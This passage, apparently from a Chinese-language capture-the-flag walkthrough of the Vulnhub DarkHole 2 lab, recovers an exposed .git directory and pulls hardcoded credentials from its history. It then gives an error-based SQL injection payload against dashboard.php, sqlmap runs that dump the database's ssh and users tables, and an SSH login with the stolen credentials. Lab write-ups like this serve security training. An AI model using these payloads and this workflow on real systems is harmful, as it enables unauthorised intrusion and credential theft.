+</span></span></code></pre></td></tr></table></div></div><p>这个报错不影响</p><p>然后就可以在 IDE 中进行审计了。不过这里有个问题可以解答一下：</p><h3 id=为什么能直接访问-git目录还需要使用-githack-等工具下载>为什么能直接访问 .git目录，还需要使用 GitHack 等工具下载？</h3><p>因为能够访问 .git 目录不等于已经获得完整、可读的源码。</p><p>.git 目录中保存的是 Git 的内部对象和元数据，直接通过浏览器访问只能看到这些原始文件。使用 GitHack 可以自动下载并解析 <code>.git</code> 中的数据，恢复成正常的项目源码目录，方便后续源码审计和查看 Git 历史。</p><p>此时可以将恢复后的源码导入 VS Code，并结合 AI Agent 辅助进行源码审计（例如重点关注 <code>config/config.php</code> 和 <code>login.php</code>，梳理登录逻辑、寻找敏感信息和潜在漏洞）；但最终仍需要人工验证 AI 发现的问题，不可全信。</p><h3 id=为什么后面又转头选择了-wget-下载目录>为什么后面又转头选择了 wget 下载目录</h3><p>当我回头访问 http://10.10.10.138/.git/ 这里的时候，发现目录里面的COMMIT_EDITMSG 储存的一句话提示 <code>i changed login.php file for more secure</code> （nmap的漏洞脚本也扫出来过）表明了我需要.git文件使用 git diff 看看 login.php 找到之前改动的可能泄露的信息或者提示</p><h3 id=那为什么-githack-和-可访问的git-目录不一样呢以及为什么没有git文件夹>那为什么 githack 和 可访问的.git 目录不一样呢，以及为什么没有.git文件夹？</h3><p>简单来说就是 GitHack 干的是“提取源码”的活，不是“克隆仓库”的活。而且 GitHack 获取的是最新的源码，不能很好的利用到这个提示</p><h3 id=wget-获取git目录>wget 获取.git目录</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>mkdir -p git-give-away
+</span></span><span class=line><span class=cl><span class=nb>cd</span> git-give-away
+</span></span><span class=line><span class=cl>wget -r -np -nH http://10.10.10.138/.git/
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DakeHole2/git-give-away<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ls -liah     
+</span></span><span class=line><span class=cl>总计 12K
+</span></span><span class=line><span class=cl><span class=m>3967506</span> drwxrwxr-x <span class=m>3</span> kali kali 4.0K  9月18日 13:00 .
+</span></span><span class=line><span class=cl><span class=m>3967505</span> drwxrwxr-x <span class=m>3</span> kali kali 4.0K  9月18日 13:00 ..
+</span></span><span class=line><span class=cl><span class=m>3967507</span> drwxrwxr-x <span class=m>7</span> kali kali 4.0K  9月18日 13:00 .git
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DakeHole2/git-give-away<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ git status
+</span></span><span class=line><span class=cl>位于分支 master
+</span></span><span class=line><span class=cl>尚未暂存以备提交的变更：
+</span></span><span class=line><span class=cl>  （使用 <span class=s2>&#34;git add/rm &lt;文件&gt;...&#34;</span> 更新要提交的内容）
+</span></span><span class=line><span class=cl>  （使用 <span class=s2>&#34;git restore &lt;文件&gt;...&#34;</span> 丢弃工作区的改动）
+</span></span><span class=line><span class=cl>        删除：     .idea/.gitignore
+</span></span><span class=line><span class=cl>        删除：     .idea/darkhole_2.iml
+</span></span><span class=line><span class=cl>        删除：     .idea/modules.xml
+</span></span><span class=line><span class=cl>        删除：     config/config.php
+</span></span><span class=line><span class=cl>        删除：     dashboard.php
+</span></span><span class=line><span class=cl>        删除：     index.php
+</span></span><span class=line><span class=cl>        删除：     js/index.js
+</span></span><span class=line><span class=cl>        删除：     login.php
+</span></span><span class=line><span class=cl>        删除：     logout.php
+</span></span><span class=line><span class=cl>        删除：     style/dashboard.css
+</span></span><span class=line><span class=cl>        删除：     style/home.jpg
+</span></span><span class=line><span class=cl>        删除：     style/index.css
+</span></span><span class=line><span class=cl>        删除：     style/login.css
+</span></span><span class=line><span class=cl>        删除：     style/login.jpg
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DakeHole2/git-give-away<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ git log --oneline
+</span></span><span class=line><span class=cl>0f1d821 <span class=o>(</span>HEAD -&gt; master<span class=o>)</span> i changed login.php file <span class=k>for</span> more secure
+</span></span><span class=line><span class=cl>a4d900a I added login.php file with default credentials
+</span></span><span class=line><span class=cl>aa2a5f3 First Initialize
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DakeHole2/git-give-away<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ git checkout .
+</span></span><span class=line><span class=cl>从索引区更新了 <span class=m>14</span> 个路径
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DakeHole2/git-give-away<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ls -liah
+</span></span><span class=line><span class=cl>总计 48K
+</span></span><span class=line><span class=cl><span class=m>3967506</span> drwxrwxr-x <span class=m>7</span> kali kali 4.0K  9月18日 13:08 .
+</span></span><span class=line><span class=cl><span class=m>3967505</span> drwxrwxr-x <span class=m>3</span> kali kali 4.0K  9月18日 13:00 ..
+</span></span><span class=line><span class=cl><span class=m>3967930</span> drwxrwxr-x <span class=m>2</span> kali kali 4.0K  9月18日 13:08 config
+</span></span><span class=line><span class=cl><span class=m>3967932</span> -rw-rw-r-- <span class=m>1</span> kali kali 5.5K  9月18日 13:08 dashboard.php
+</span></span><span class=line><span class=cl><span class=m>3967507</span> drwxrwxr-x <span class=m>7</span> kali kali 4.0K  9月18日 13:08 .git
+</span></span><span class=line><span class=cl><span class=m>3967926</span> drwxrwxr-x <span class=m>2</span> kali kali 4.0K  9月18日 13:08 .idea
+</span></span><span class=line><span class=cl><span class=m>3967933</span> -rw-rw-r-- <span class=m>1</span> kali kali 1.1K  9月18日 13:08 index.php
+</span></span><span class=line><span class=cl><span class=m>3967934</span> drwxrwxr-x <span class=m>2</span> kali kali 4.0K  9月18日 13:08 js
+</span></span><span class=line><span class=cl><span class=m>3967936</span> -rw-rw-r-- <span class=m>1</span> kali kali 1.5K  9月18日 13:08 login.php
+</span></span><span class=line><span class=cl><span class=m>3967937</span> -rw-rw-r-- <span class=m>1</span> kali kali  <span class=m>179</span>  9月18日 13:08 logout.php
+</span></span><span class=line><span class=cl><span class=m>3967938</span> drwxrwxr-x <span class=m>2</span> kali kali 4.0K  9月18日 13:08 style
+</span></span></code></pre></td></tr></table></div></div><p>接下来查看旧版 login.php 的完整内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DakeHole2/git-give-away<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ git diff HEAD~1 HEAD -- login.php
+</span></span><span class=line><span class=cl>diff --git a/login.php b/login.php
+</span></span><span class=line><span class=cl>index 8a0ff67..0904b19 <span class=m>100644</span>
+</span></span><span class=line><span class=cl>--- a/login.php
+</span></span><span class=line><span class=cl>+++ b/login.php
+</span></span><span class=line><span class=cl>@@ -2,7 +2,10 @@
+</span></span><span class=line><span class=cl> session_start<span class=o>()</span><span class=p>;</span>
+</span></span><span class=line><span class=cl> require <span class=s1>&#39;config/config.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl> <span class=k>if</span><span class=o>(</span><span class=nv>$_SERVER</span><span class=o>[</span><span class=s1>&#39;REQUEST_METHOD&#39;</span><span class=o>]</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=o>){</span>
+</span></span><span class=line><span class=cl>-    <span class=k>if</span><span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;email&#39;</span><span class=o>]</span> <span class=o>==</span> <span class=s2>&#34;lush@admin.com&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;password&#39;</span><span class=o>]</span> <span class=o>==</span> <span class=s2>&#34;321&#34;</span><span class=o>){</span>
+</span></span><span class=line><span class=cl>+    <span class=nv>$email</span> <span class=o>=</span> mysqli_real_escape_string<span class=o>(</span><span class=nv>$connect</span>,htmlspecialchars<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;email&#39;</span><span class=o>]))</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>+    <span class=nv>$pass</span> <span class=o>=</span> mysqli_real_escape_string<span class=o>(</span><span class=nv>$connect</span>,htmlspecialchars<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;password&#39;</span><span class=o>]))</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>+    <span class=nv>$check</span> <span class=o>=</span> <span class=nv>$connect</span>-&gt;query<span class=o>(</span><span class=s2>&#34;select * from users where email=&#39;</span><span class=nv>$email</span><span class=s2>&#39; and password=&#39;</span><span class=nv>$pass</span><span class=s2>&#39; and id=1&#34;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>+    <span class=k>if</span><span class=o>(</span><span class=nv>$check</span>-&gt;num_rows<span class=o>){</span>
+</span></span><span class=line><span class=cl>         <span class=nv>$_SESSION</span><span class=o>[</span><span class=s1>&#39;userid&#39;</span><span class=o>]</span> <span class=o>=</span> 1<span class=p>;</span>
+</span></span><span class=line><span class=cl>         header<span class=o>(</span><span class=s2>&#34;location:dashboard.php&#34;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>         die<span class=o>()</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>原先的代码直接把账号密码写死在代码里： <a class=link href=mailto:lush@admin.com>lush@admin.com</a> 321。</p><p>后面改成了从数据库查询，并且加了 mysqli_real_escape_string<code>和</code>htmlspecialchars 过滤</p><p>但问题在于：旧版的硬编码凭据极有可能在数据库里依然有效，或者管理员根本没有改密码！这就是 .git 泄露最致命的地方——历史提交里藏着过去的秘密</p><h3 id=为什么-wget-下载后只有-git-文件夹没有源码文件>为什么 wget 下载后只有 .git 文件夹，没有源码文件？</h3><p>不是 wget 没下完整，而是它下载的东西本来就只有 .git 目录。源码文件根本不在那个 URL 下面。</p><p>.git 和源码是两回事</p><p>服务器上 Web 根目录里实际存在两类东西：</p><div class=table-wrapper><table><thead><tr><th>类型</th><th>路径示例</th><th>说明</th></tr></thead><tbody><tr><td>工作区源码文件</td><td><code>/login.php</code>、<code>/dashboard.php</code>、<code>/config/config.php</code></td><td>普通文件，可直接访问</td></tr><tr><td>Git 仓库数据</td><td><code>/.git/</code> 里的 <code>HEAD</code>、<code>objects/</code>、<code>refs/</code>、<code>logs/</code></td><td>Git 内部数据，不是源码</td></tr></tbody></table></div><p><code>wget -r http://10.10.10.138/.git/</code> 只爬 .git/ 这一个目录，所以它只会下载 <code>.git/</code> 里的东西，不会去下 <code>/login.php</code>。不是下不全，而是你让它下的范围就只有 .git/</p><h3 id=回到80端口拿着获取的账号密码去登陆>回到80端口，拿着获取的账号密码去登陆</h3><p>登陆后跳转到http://10.10.10.138/dashboard.php?id=1</p><p>值得注意的两个信息</p><ol><li>这个账户归属人的信息</li><li>注意这个url有个id=1，可以联想到sql注入或者idor。只是猜测，通过下载的源码可以进行分析，是否存在漏洞</li></ol><h3 id=审计源码寻找漏洞>审计源码寻找漏洞</h3><h4 id=sql-注入点dashboardphp-的-mobile-参数>SQL 注入点：<code>dashboard.php</code> 的 <code>mobile</code> 参数</h4><p><code>dashboard.php</code> 被 <code>goto</code> 和十六进制编码混淆过，但核心逻辑可以还原出来。关键代码在文件开头的 POST 处理块中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;REQUEST_METHOD&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;POST&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$fname</span>   <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$connect</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;fname&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$email</span>   <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$connect</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;email&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$address</span> <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$connect</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;address&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$mobile</span>  <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;mobile&#34;</span><span class=p>];</span>   <span class=c1>// 未经过滤！
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$connect</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;UPDATE users SET 
+</span></span></span><span class=line><span class=cl><span class=s2>        username=&#39;</span><span class=si>{</span><span class=nv>$fname</span><span class=si>}</span><span class=s2>&#39;,
+</span></span></span><span class=line><span class=cl><span class=s2>        email=&#39;</span><span class=si>{</span><span class=nv>$email</span><span class=si>}</span><span class=s2>&#39;,
+</span></span></span><span class=line><span class=cl><span class=s2>        address=&#39;</span><span class=si>{</span><span class=nv>$address</span><span class=si>}</span><span class=s2>&#39;,
+</span></span></span><span class=line><span class=cl><span class=s2>        contact_number=&#39;</span><span class=si>{</span><span class=nv>$mobile</span><span class=si>}</span><span class=s2>&#39; 
+</span></span></span><span class=line><span class=cl><span class=s2>        WHERE id=1&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><strong>问题点</strong>：</p><ul><li><code>fname</code>、<code>email</code>、<code>address</code> 都用了 <code>mysqli_real_escape_string</code> 转义；</li><li>但 <code>mobile</code> 直接取 <code>$_POST["mobile"]</code>，<strong>没有做任何过滤或转义</strong>；</li><li>它被直接拼接进 <code>UPDATE</code> 语句的 <code>contact_number='{$mobile}'</code> 中，单引号可以被闭合，造成 UPDATE 型 SQL 注入。</li></ul><p><strong>注入验证思路</strong>：</p><p>向 <code>dashboard.php</code> 发送 POST 请求，在 <code>mobile</code> 参数中构造 payload，例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mobile</span><span class=o>=</span><span class=mi>1</span><span class=s1>&#39; and extractvalue(1,concat(0x7e,database()))-- -
+</span></span></span></code></pre></td></tr></table></div></div><p>如果页面报出 <code>XPATH syntax error: '~darkhole_2'</code>，说明注入成功。</p><p><strong>注意</strong>：URL 中的 <code>?id=1</code> 并不是注入点，源码里没有使用 <code>$_GET['id']</code>，它只是一个摆设。真正的注入点在 POST 的 <code>mobile</code> 参数。</p><h3 id=利用-burp-和-sqlmap-进行-sql-注入>利用 Burp 和 sqlmap 进行 SQL 注入</h3><p>首先在 <code>dashboard.php</code> 页面点击 SUBMIT 进行抓包，记录下请求中的 <code>PHPSESSID</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Cookie: PHPSESSID=jlmkbnn53b8qrtobthge8onaun
+</span></span></code></pre></td></tr></table></div></div><p>打开 sqlmap，对 <code>id</code> 参数进行检测：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>E:</span><span class=p>\</span><span class=n>Tools</span><span class=p>\</span><span class=n>天狐渗透工具箱</span><span class=p>-</span><span class=n>社区版V4</span><span class=p>.</span><span class=mf>0</span><span class=p>\</span><span class=n>tools</span><span class=p>\</span><span class=n>gui_scan</span><span class=p>\</span><span class=n>sqlmap</span><span class=p>&gt;</span><span class=n>python</span> <span class=n>sqlmap</span><span class=p>.</span><span class=py>py</span> <span class=n>-u</span> <span class=s2>&#34;http://10.10.10.138/dashboard.php?id=1&#34;</span> <span class=p>-</span><span class=n>-dbs</span> <span class=p>-</span><span class=n>-batch</span> <span class=p>-</span><span class=n>-cookie</span> <span class=n>PHPSESSID</span><span class=p>=</span><span class=n>jlmkbnn53b8qrtobthge8onaun</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里发现源码版本未发现 id 注入，但实际运行环境存在差异，最终实测发现 id 可注入</p><p>关键输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>GET parameter &#39;id&#39; is vulnerable.
+</span></span><span class=line><span class=cl>Type: time-based blind
+</span></span><span class=line><span class=cl>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+</span></span><span class=line><span class=cl>Payload: id=1&#39; AND (SELECT 4982 FROM (SELECT(SLEEP(5)))VGFj) AND &#39;ZlaS&#39;=&#39;ZlaS
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Type: UNION query
+</span></span><span class=line><span class=cl>Title: Generic UNION query (NULL) - 6 columns
+</span></span><span class=line><span class=cl>Payload: id=-6241&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,...),NULL,NULL,NULL-- -
+</span></span></code></pre></td></tr></table></div></div><p>数据库列表：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>available databases [5]:
+</span></span><span class=line><span class=cl>[*] darkhole_2
+</span></span><span class=line><span class=cl>[*] information_schema
+</span></span><span class=line><span class=cl>[*] mysql
+</span></span><span class=line><span class=cl>[*] performance_schema
+</span></span><span class=line><span class=cl>[*] sys
+</span></span></code></pre></td></tr></table></div></div><p>sqlmap 判断该注入点存在 UNION 注入，并确定查询结果包含 6 列，因此后续可以利用 UNION 查询获取数据库中的其他数据，直接枚举 <code>darkhole_2</code> 库中的表：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>python</span> <span class=n>sqlmap</span><span class=p>.</span><span class=py>py</span> <span class=n>-u</span> <span class=s2>&#34;http://10.10.10.138/dashboard.php?id=1&#34;</span> <span class=p>-</span><span class=n>-cookie</span><span class=p>=</span><span class=s2>&#34;PHPSESSID=jlmkbnn53b8qrtobthge8onaun&#34;</span> <span class=n>-D</span> <span class=n>darkhole_2</span> <span class=p>-</span><span class=n>-tables</span> <span class=p>-</span><span class=n>-batch</span>
+</span></span></code></pre></td></tr></table></div></div><p>发现两张表：<code>ssh</code> 和 <code>users</code>。</p><p>分别 dump：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>python</span> <span class=n>sqlmap</span><span class=p>.</span><span class=py>py</span> <span class=n>-u</span> <span class=s2>&#34;http://10.10.10.138/dashboard.php?id=1&#34;</span> <span class=p>-</span><span class=n>-cookie</span><span class=p>=</span><span class=s2>&#34;PHPSESSID=jlmkbnn53b8qrtobthge8onaun&#34;</span> <span class=n>-D</span> <span class=n>darkhole_2</span> <span class=n>-T</span> <span class=n>ssh</span> <span class=p>-</span><span class=n>-dump</span> <span class=p>-</span><span class=n>-batch</span> <span class=p>-</span><span class=n>-technique</span><span class=p>=</span><span class=n>U</span> <span class=p>-</span><span class=n>-union-cols</span><span class=p>=</span><span class=mf>6</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>ssh</code> 表内容：</p><div class=table-wrapper><table><thead><tr><th>id</th><th>pass</th><th>user</th></tr></thead><tbody><tr><td>1</td><td>fool</td><td>jehad</td></tr></tbody></table></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>python</span> <span class=n>sqlmap</span><span class=p>.</span><span class=py>py</span> <span class=n>-u</span> <span class=s2>&#34;http://10.10.10.138/dashboard.php?id=1&#34;</span> <span class=p>-</span><span class=n>-cookie</span><span class=p>=</span><span class=s2>&#34;PHPSESSID=jlmkbnn53b8qrtobthge8onaun&#34;</span> <span class=n>-D</span> <span class=n>darkhole_2</span> <span class=n>-T</span> <span class=n>users</span> <span class=p>-</span><span class=n>-dump</span> <span class=p>-</span><span class=n>-batch</span> <span class=p>-</span><span class=n>-technique</span><span class=p>=</span><span class=n>U</span> <span class=p>-</span><span class=n>-union-cols</span><span class=p>=</span><span class=mf>6</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>users</code> 表内容：</p><div class=table-wrapper><table><thead><tr><th>id</th><th>email</th><th>address</th><th>password</th><th>username</th><th>contact_number</th></tr></thead><tbody><tr><td>1</td><td><a class=link href=mailto:lush@admin.com>lush@admin.com</a></td><td>Street, Pincode, Province/State, Country</td><td>321</td><td>Jehad Alqurashiasddasdasdas</td><td>1</td></tr></tbody></table></div><p>至此，获得 SSH 凭据：<code>jehad / fool</code>，以及后台账号：<code>lush@admin.com / 321</code>。</p><h2 id=ssh-登陆-jehad账户>SSH 登陆 jehad账户</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DakeHole2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ssh jehad@10.10.10.138
+</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.10.10.138 (10.10.10.138)&#39;</span> can<span class=s1>&#39;t be established.
+</span></span></span><span class=line><span class=cl><span class=s1>ED25519 key fingerprint is: SHA256:JmrTZ4RY4EPBC4GpHk9i3+c29L5n1QtcfSgbqG8D2+8
+</span></span></span><span class=line><span class=cl><span class=s1>This key is not known by any other names.
+</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.10.10.138<span class=s1>&#39; (ED25519) to the list of known hosts.
+</span></span></span><span class=line><span class=cl><span class=s1>** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span></span><span class=line><span class=cl><span class=s1>** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+</span></span></span><span class=line><span class=cl><span class=s1>** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span></span><span class=line><span class=cl><span class=s1>jehad@10.10.10.138&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.3 LTS <span class=o>(</span>GNU/Linux 5.4.0-81-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System information as of Fri <span class=m>18</span> Sep <span class=m>2026</span> 06:07:30 PM UTC
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System load:  0.03               Processes:              <span class=m>230</span>
+</span></span><span class=line><span class=cl>  Usage of /:   48.6% of 12.73GB   Users logged in:        <span class=m>0</span>
+</span></span><span class=line><span class=cl>  Memory usage: 20%                IPv4 address <span class=k>for</span> ens33: 10.10.10.138
+</span></span><span class=line><span class=cl>  Swap usage:   0%
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Super-optimized <span class=k>for</span> small spaces - <span class=nb>read</span> how we shrank the memory
+</span></span><span class=line><span class=cl>   footprint of MicroK8s to make it the smallest full K8s around.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   https://ubuntu.com/blog/microk8s-memory-optimisation
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
+</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Last login: Fri Sep  <span class=m>3</span> 05:49:05 <span class=m>2021</span> from 192.168.135.128
+</span></span><span class=line><span class=cl>jehad@darkhole:~$ 
